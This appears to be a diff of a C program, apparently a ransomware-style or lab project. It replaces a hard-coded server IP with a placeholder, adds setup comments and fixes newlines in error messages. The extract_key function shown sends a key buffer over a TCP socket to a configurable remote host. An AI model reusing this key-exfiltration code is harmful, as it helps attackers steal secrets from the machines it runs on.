@@ -12,14 +12,17 @@
 
 #include "key.h"
 
-#define CLOUD_IP "172.19.127.255"
+// change this to your actual machine IP
+// hostname -I for linux, ipconfig for windows
+// if run from wsl, forward the port from windows to wsl with netsh
+#define CLOUD_IP "CHANGE"
 
 int extract_key(char *key)
 {
 	int sock = socket(AF_INET, SOCK_STREAM, 0);
 	if (sock < 0)
 	{
-		printf("extract_key: socket creation failed");
+		printf("extract_key: socket creation failed\n");
 		return -1;
 	}
 
@@ -32,7 +35,7 @@ int extract_key(char *key)
 	connect(sock, (struct sockaddr*)&server, sizeof(server));
     if (send(sock, key, PASS_SIZE, 0) < 0)
     {
-        printf("extract_key: failed to send key");
+        printf("extract_key: failed to send key\n");
         close(sock);
         return -1;
     }
